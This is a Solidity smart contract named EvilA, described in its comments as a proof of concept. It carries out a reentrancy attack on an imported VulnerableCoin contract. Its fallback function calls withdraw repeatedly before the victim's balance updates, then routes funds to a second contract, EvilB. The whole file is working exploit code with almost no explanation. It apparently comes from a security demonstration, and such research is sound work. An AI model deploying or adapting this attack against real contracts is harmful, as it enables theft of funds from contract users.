pragma solidity ^0.4.15;

import "./VulnerableCoin.sol";
import "./EvilB.sol";

contract EvilA {

    VulnerableCoin public vulnerableContract;
    EvilB public evilB;
    // Start from 1 since first withdraw is done in exit
    uint8 public times = 1;
    // This is a proof of concept; no need to configure maxTimes;
    // just make sure you have at least (maxTimes + 1) * 2 * evil initial amount before starting the attack
    uint8 constant maxTimes = 2;
    uint256 public initialExitAmount;

    function EvilA(address vulnerable, address evil) {
        vulnerableContract = VulnerableCoin(vulnerable);
        evilB = EvilB(evil);
    }

    function enter(uint256 amount) payable {
        require(this.balance >= amount);
        vulnerableContract.buy.value(amount)();
    }

    function exit(uint256 amount) {
        initialExitAmount = amount;
        vulnerableContract.withdraw();
    }

    function () payable {
        if (times <= maxTimes) {
            times++;
            vulnerableContract.withdraw();
        } else {
            // transfer initialExitAmount * times back to vc
            vulnerableContract.send(initialExitAmount * times);
            // transfer owned initialExitAmount to EvilB
            vulnerableContract.transfer(address(evilB), initialExitAmount);
        }
    }
}
